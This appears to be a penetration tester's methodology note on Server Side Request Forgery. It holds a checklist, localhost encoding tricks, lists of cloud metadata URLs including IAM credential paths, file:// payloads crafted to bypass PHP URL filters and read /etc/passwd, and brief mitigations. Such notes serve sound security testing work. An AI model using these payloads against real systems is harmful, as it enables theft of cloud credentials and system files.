---
title: "SSRF"
layout: notes
tags:
  - webapp
  - methodology
  - ssrf
  - FI_parameters
  - FI_http-headers
  - FI_user-input
  - Co_lfi
  - Co_rce
  - Co_dos
  - Co_sensitive-info-disclosure
---
## Summary

Server Side Request Forgery at its core is a technique to trick a server's request into accessing backend 'server-only' or external resources on your behalf. This might allow you to bypass authentication or authorization methods in place to achieve unintended or even unexpected functionality from the webapp. This vulnerability is common though often goes under the radar as its attack surface is theoretically the entire website. SSRF can be chained together with exploits such as Open Redirect and XXE - XML External Entity to further expand the attack surface and bypass filters. Generally if a user controls a request to a backend service there is probably a way to modify that request and achieve SSRF.

## Methodology

Things to ask/try when searching for SSRF:
- [ ] **Are there any endpoints sent to a backend server that I can manipulate?**
- [ ] **Are there filters in place?**
	- [ ] **What could these filters be trying to prevent?**
- [ ] try to access localhost
	- [ ] try using different ways to refer to localhost
		- [ ] try hex `0x7f.0x0.0x0.0x1`
		- [ ] try octal `0177.0.0.01` or `017700000001`
		- [ ] try Dword `http://2130706433`
		- [ ] try mixed `http://0177.0.0.0x1`
		- [ ] try shorthand `127.1`
		- [ ] try IPv6 `http://[::]:1337/` `http://0000::1:1337/`
		- [ ] use bubble text [https://capitalizemytitle.com/bubble-text-generator/](https://capitalizemytitle.com/bubble-text-generator/)
	- [ ] can you use nip.io to redirect to a local address
- [ ] try to urlencode special characters
	- [ ] if you see no results try to double urlencode key special characters
- [ ] try case different letters within domains or endpoints `aDmin`
- [ ] try username/password @ expected host
	- [ ] `http://username:password@expected.domain`
- [ ] try commenting out expected values/host with #
- [ ] try to use . between the expected host and bad host to abuse DNS naming hierarchies 
- [ ] try to chain open redirect to bypass filters
- [ ] try to use the referer header to abuse logger logic
- [ ] try to redirect output to an external server to check for data leakage and OAST
- [ ] try changing protocol (https or http)
	- [ ] try `file dict ftp tftp sftp ldap gopher`
	- [ ] try adding a `?` to force validate as a url and bypass content check
		- [ ] `file:/etc/passwd?/` will bypass FILTER_VALIDATE_URL and FILTER_FLAG_QUERY_REQUIRED
		- [ ] `file:///etc/?/../passwd` will bypass contents check from file_get_contents()
- [ ] if you have XXE try to smuggle SSRF inside of XXE

<br>
IF YOU FIND SSRF WITH RESPONSES
- [ ] try to scan for IPs and ports with burp intruder
	- [ ] any successful hits enumerate further and determine the service/attack surface
- [ ] look through documentation of the backend service
- [ ] try to get any AWS related endpoints

<br>
IF YOU FIND BLIND SSRF FROM OAST TECHNIQUES
- [ ] try to construct a payload using information from how the service is meant to run
- [ ] maybe toss in the report if you can find something like admin portal functionality

## Capabilities

Local File Inclusion  
Sensitive Data Exposure  
Remote Code Execution  
Denial of Service  

## Found In

Parameters  
User Input  
HTTP Headers  

## Tools/Examples

[https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet](https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet)

[https://nip.io/](https://nip.io/)
```
10.0.0.1.nip.io maps to 10.0.0.1
192-168-1-250.nip.io maps to 192.168.1.250
0a000803.nip.io maps to 10.0.8.3
```

common configuration files
```
.htaccess
.htpasswd
web.config
.git/config
nginx.conf
server-status
status
cgi-bin/php.ini
DOCKERFILE
sitemap.xml
robots.txt
/swagger
```

usual suspects
```html
http://localhost/admin
file://etc/passwd
```

[https://gist.github.com/jhaddix/78cece26c91c6263653f31ba453e273b](https://gist.github.com/jhaddix/78cece26c91c6263653f31ba453e273b)
```
## AWS
# from http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories

http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/reservation-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key

# AWS - Dirs 

http://169.254.169.254/
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/public-keys/

## Google Cloud
#  https://cloud.google.com/compute/docs/metadata
#  - Requires the header "Metadata-Flavor: Google" or "X-Google-Metadata-Request: True"

http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
http://metadata/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/id
http://metadata.google.internal/computeMetadata/v1/project/project-id

# Google allows recursive pulls 
http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true

## Google
#  Beta does NOT require a header atm (thanks Mathias Karlsson @avlidienbrunn)

http://metadata.google.internal/computeMetadata/v1beta1/

## Digital Ocean
# https://developers.digitalocean.com/documentation/metadata/

http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/ 
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/region
http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address

## Packetcloud

https://metadata.packet.net/userdata

## Azure
#  Limited, maybe more exist?
# https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/
http://169.254.169.254/metadata/v1/maintenance

## Update Apr 2017, Azure has more support; requires the header "Metadata: true"
# https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service
http://169.254.169.254/metadata/instance?api-version=2017-04-02
http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text

## OpenStack/RackSpace 
# (header required? unknown)
http://169.254.169.254/openstack

## HP Helion 
# (header required? unknown)
http://169.254.169.254/2009-04-04/meta-data/ 

## Oracle Cloud
http://192.0.0.192/latest/
http://192.0.0.192/latest/user-data/
http://192.0.0.192/latest/meta-data/
http://192.0.0.192/latest/attributes/

## Alibaba
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/image-id
```

ways to bypass content types and URL filtering
cases for bypassing FILTER_VALIDATE_URL   FILTER_FLAG_QUERY_REQUIRED   file_get_contents()
```
file:/etc/passwd?/
file:/etc/passwd%3F/
file:/etc%252Fpasswd/
file:/etc%252Fpasswd%3F/
file:///etc/?/../passwd
file:///etc/%3F/../passwd
file:${br}/et${u}c/pas${te}swd?/
file:$(br)/et$(u)c/pas$(te)swd?/
file:${br}/et${u}c%252Fpas${te}swd?/
file:$(br)/et$(u)c%252Fpas$(te)swd?/
file:${br}/et${u}c%252Fpas${te}swd%3F/
file:$(br)/et$(u)c%252Fpas$(te)swd%3F/
file:///etc/passwd?/../passwd
```

#### Mitigation

Limit port connections, whitelist certain hosts?  
Resolve IPs for external hosts and reject internal IP  
Disable access to non http or https protocols  

